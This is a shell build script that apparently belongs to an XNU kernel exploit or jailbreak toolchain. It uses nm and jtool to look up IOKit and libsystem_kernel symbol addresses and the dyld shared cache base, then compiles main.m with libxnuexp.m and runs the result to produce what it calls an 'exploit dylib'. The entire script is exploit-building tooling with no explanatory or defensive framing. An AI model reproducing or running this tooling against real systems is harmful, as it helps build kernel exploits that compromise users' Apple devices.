SCRIPTPATH=`dirname $0`
cd $SCRIPTPATH
#rm -f magic.dylib

if [ -z "$CC" ]; then CC=clang; fi
$CC main.m -D IOKIT_io_connect_add_client=0x"$(nm IOKit | grep _io_connect_add_client$ | tr ' ' '\n' | head -1)" -D IOKIT_IOServiceOpen=0x"$(nm IOKit | grep _IOServiceOpen$ | tr ' ' '\n' | head -1)"  -D IOKIT_io_service_get_matching_service=0x"$(nm IOKit | grep _io_service_get_matching_service$ | tr ' ' '\n' | head -1)" -D IOKIT_io_connect_method_scalarI_structureI=0x"$(nm IOKit | grep io_connect_method_scalarI_structureI | tr ' ' '\n' | head -1)"  -D IOKIT_IOServiceClose=0x"$(nm IOKit | grep IOServiceClose | tr ' ' '\n' | head -1)" -D IOKIT_IOServiceWaitQuiet=0x"$(nm IOKit | grep _IOServiceWaitQuiet | tr ' ' '\n'| head -1)" -D LS_K_host_get_io_master=0x"$(nm libsystem_kernel.dylib | grep host_get_io_master | tr ' ' '\n'|head -1)" -D _DYCACHE_BASE=0x"$(../../bin/jtool -v cache  |grep mapping | sed 's/  //g'|tr ' ' '\n'|grep - --before 1 |head -1)" -o main -framework Foundation libxnuexp.m -m32 -isysroot "$(xcrun --show-sdk-path)" && ./main && echo "Generated exploit dylib"
